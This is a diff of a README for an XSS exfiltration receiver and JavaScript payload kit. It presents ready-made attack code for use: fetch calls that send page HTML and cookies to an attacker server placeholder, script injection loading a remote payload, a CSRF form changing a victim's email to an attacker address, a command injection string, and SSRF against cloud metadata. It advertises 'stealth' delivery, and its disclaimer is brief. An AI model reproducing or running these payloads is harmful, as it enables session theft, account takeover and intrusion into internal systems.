@@ -1,149 +1,194 @@
 
-# 🕵️ XSS Exfiltration Receiver
 
-This is a Python-based threaded HTTP server designed to **receive and decode exfiltrated data** (often from XSS payloads). 
-It supports recursive Base64 and URL decoding, HTML saving, raw logging, and JSON-based metadata output — optionally with IP whitelisting.
+# 🕵️ XSS Exfiltration Receiver & Payload Kit ( Beta )
 
----
-
-## 🚀 Features
-
-- ✅ URL + Base64 recursive decoding
-- ✅ Decoded HTML auto-saving
-- ✅ Raw payload saving
-- ✅ JSON structured logs (for JIRA/ELK/etc.)
-- ✅ Optional IP whitelisting
-- ✅ Multithreaded (safe concurrent handling)
-- ✅ Works with GET, POST, OPTIONS
+This package provides a complete system for capturing, decoding, and analyzing XSS-exfiltrated data via HTTP requests. 
+It includes a threaded Python-based receiver and a stealthy, modular JavaScript payload library designed for DOM inspection, internal API probing, light CSRF, and command injection testing.
 
 ---
 
-## 🧪 How to Use
+## 📦 Contents (.. in development ..)
 
-### 1. 🔧 Start the Server
+```
+
+xss\_receiver/
+├── xssrecv.py         # Python receiver (GET/POST support, decoder)
+├── payloads.js        # Modular JS payload library
+├── payloads.min.js    # Minified version for stealth deployment
+├── payloads.bmk.js    # Bookmarklet version
+└── README.md          # This file
+
+````
+
+---
+
+## 🚀 Getting Started
+
+### 1. Run the Receiver
 
 ```bash
 python3 xssrecv.py --port 8080 --show --json-log --allow-ip 127.0.0.1
 ````
 
-| Flag         | Purpose                                    |
-| ------------ | ------------------------------------------ |
-| `--port`     | Server port (default is 80)                |
-| `--show`     | Print decoded HTML to terminal             |
-| `--json-log` | Save decoded logs as structured JSONL file |
-| `--allow-ip` | Restrict access to specific IP addresses   |
+| Flag         | Description                                           |
+| ------------ | ----------------------------------------------------- |
+| `--port`     | Port to listen on (default: `80`)                     |
+| `--show`     | Print decoded HTML to terminal if present             |
+| `--json-log` | Save logs to `decoded_html/log.jsonl`                 |
+| `--allow-ip` | Restrict access to IPs (e.g., `--allow-ip 127.0.0.1`) |
 
 ---
 
-### 2. 🧨 Send a Payload to the Victim
+### 2. Deliver JavaScript Payload
 
-#### Example Payload (JavaScript)
+#### Option 1: Inline Injection
 
-```js
-fetch("http://YOUR_SERVER_IP:8080/?data=" + btoa(document.documentElement.outerHTML));
+Inject this script into a vulnerable page:
+
+```html
+<script src="http://YOUR-IP:8080/x.js"></script>
 ```
 
-You can also encode the payload even further using `encodeURIComponent`:
+#### Option 2: Bookmarklet
+
+Paste the content of `payloads.bmk.js` into a bookmark and click it while visiting the target app.
+
+---
+
+## 💥 Payload Overview
+
+The included `payloads.js` covers multiple testing scenarios:
+
+| Category        | Description                                          |
+| --------------- | ---------------------------------------------------- |
+| DOM Dump        | Collects and sends the full HTML DOM                 |
+| Cookie Theft    | Sends cookies and environment info                   |
+| CSRF (GET/POST) | Triggers light GET/POST CSRF to local endpoints      |
+| Command Probe   | Sends `id`, `whoami`, or `curl`-style blind requests |
+| SSRF            | Hits local/internal metadata endpoints               |
+| Probing         | Discovers `/api`, `/admin`, `/config` on same-origin |
+| Timing          | Profiles request latency                             |
+| Error Beacons   | Captures uncaught JS errors                          |
+
+---
+
+## 🔐 Sample Payloads (Inside `payloads.js`)
 
 ```js
-fetch("http://YOUR_SERVER_IP:8080/?data=" + encodeURIComponent(btoa(document.documentElement.outerHTML)));
-```
+// DOM exfiltration
+postData(btoa(document.documentElement.outerHTML));
 
-#### POST Variant
+// Cookie + fingerprint
+postData(btoa(document.cookie + " | " + navigator.userAgent));
 
-```js
-fetch("http://YOUR_SERVER_IP:8080", {
+// CSRF auto-form
+let f = document.createElement("form");
+f.method = "POST";
+f.action = ORIGIN + "/account/change-email";
+let i = document.createElement("input");
+i.name = "email";
+i.value = "admin@attacker.test";
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
+
+// Command Injection attempt
+fetch("/api/system/check", {
   method: "POST",
-  body: "data=" + encodeURIComponent(btoa(document.documentElement.outerHTML)),
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  }
-});
+  body: JSON.stringify({ host: "127.0.0.1; id" }),
+  headers: { "Content-Type": "application/json" }
+}).then(r => r.text()).then(t => postData(btoa(t)));
+
+// SSRF to cloud metadata
+fetch("http://169.254.169.254/latest/meta-data/hostname")
+  .then(r => r.text()).then(t => postData(btoa(t)));
 ```
 
 ---
 
-### 3. 📂 Output Behavior
+## 🖥️ Hosting Payloads with the Receiver
 
-When a payload is received:
+Your `xssrecv.py` is preconfigured to serve:
 
-* ✅ The parameter (e.g., `data=...`) is extracted and recursively decoded.
-* ✅ If it contains `<html>` or `<!doctype`, the HTML is saved to `decoded_html/decoded_TIMESTAMP.html`.
-* ✅ Raw query string is saved to `decoded_html/raw_TIMESTAMP.txt`.
-* ✅ If `--json-log` is enabled, a JSON log entry is written to `decoded_html/log.jsonl`.
+* `http://YOUR-IP:8080/x.js` → `payloads.js`
+* You can add:
 
----
-
-### 4. 🔍 Example Request/Output Flow
-
-#### Example Request:
-
-```
-GET /?data=Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg==
-```
-
-#### Console Output:
-
-```
-[+] Raw (data): &lt;html&gt;&lt;body&gt;Test</body>
-    Layer 1 (url): ...
-    Layer 2 (b64): <html><body>Test</body>
-[+] Final preview: '<html><body>Test'
-[+] Saved HTML: decoded_html/decoded_20250705T204000Z.html
-```
-
-#### Example JSON Log:
-
-```json
-{
-  "timestamp": "20250705T204000Z",
-  "ip": "127.0.0.1",
-  "headers": {
-    "User-Agent": "...",
-    "Referer": null
-  },
-  "raw": "data=Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg==",
-  "decoded_layers": [
-    ["url", "Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg=="],
-    ["b64", "<html><body>Test</body>"]
-  ],
-  "final_preview": "<html><body>Test</body>",
-  "saved_html": "decoded_html/decoded_20250705T204000Z.html"
-}
-```
+  * `x.min.js` → for stealth minified delivery
+  * `x.bmk.js` → for bookmarklet version
 
 ---
 
-## 🧷 Tips for Use in XSS
+## 📂 Decoded Output
 
-* Encode exfil payloads with `btoa()` (Base64) and optionally `encodeURIComponent()` for extra URL safety.
-* Use this tool to debug and analyze stolen DOM, cookies, credentials, etc.
-* Always use `HTTPS` in real-world testing to avoid browser blocks.
-* Whitelist only your IP (`--allow-ip`) for safe use in the field.
+All captured and decoded data is saved to:
+
+| File/Folder               | Purpose                          |
+| ------------------------- | -------------------------------- |
+| `decoded_html/`           | Output directory                 |
+| `decoded_YYYYMMDDT..html` | Saved decoded HTML content       |
+| `raw_YYYYMMDDT..txt`      | Raw query string or POST data    |
+| `log.jsonl`               | JSON log of all captured entries |
+
+Each entry includes IP, timestamp, headers, decoded layers, and preview content.
+
+---
+
+## 🔧 Extending
+
+You can easily extend `payloads.js` to:
+
+* Add fingerprinting logic
+* Trigger internal SSRF/CSRF/RCE probes
+* Enumerate form fields, tokens, iframes, or script execution results
+* Chain logic with `setTimeout`, `Promise`, or `MutationObserver`
+
+You can also update `xssrecv.py` to:
+
+* Forward exfiltrated content to webhooks
+* Send email/SMS alerts
+* Automatically replay stored HTML
+
+---
+
+## 🧪 Testing It Out
+
+1. Start the receiver:
+
+```bash
+python3 xssrecv.py --port 8080 --show --json-log
+```
+
+2. On another device or browser, simulate the victim:
+
+```html
+<script src="http://YOUR-IP:8080/x.js"></script>
+```
+
+3. Watch decoded payloads being saved and printed in real time.
 
 ---
 
 ## ⚠️ Legal Disclaimer
 
-This tool is intended for **educational and authorized penetration testing purposes only**. Do **not** use this on systems you do not own or have explicit permission to test.
+This tool is for **authorized security testing and educational use only**. 
+Do not use against systems without **explicit written permission**. Always follow your organization's rules of engagement and testing scope.
 
 ---
 
 ## 🛠 TODO / Ideas
 
-* [ ] Optional webhook forwarding of decoded data
-* [ ] TLS/HTTPS support via cert
-* [ ] Replay decoded HTML in browser viewer mode
+* [ ] Add TLS/HTTPS support
+* [ ] Webhook alert forwarding (Slack/Discord)
+* [ ] DOM replay viewer UI
+* [ ] Auto-generate signed payloads
+* [ ] Dockerfile + Makefile for deployment
 
 ---
 
-## 📎 License
+## 🧠 Credits
 
-MIT — use responsibly.
+Built by operators for operators. Use responsibly.
 
 ```
+\
 
----
-
-Let me know if you'd like a version of the README that includes screenshots, Docker instructions, or GitHub Actions for deployment.
-```
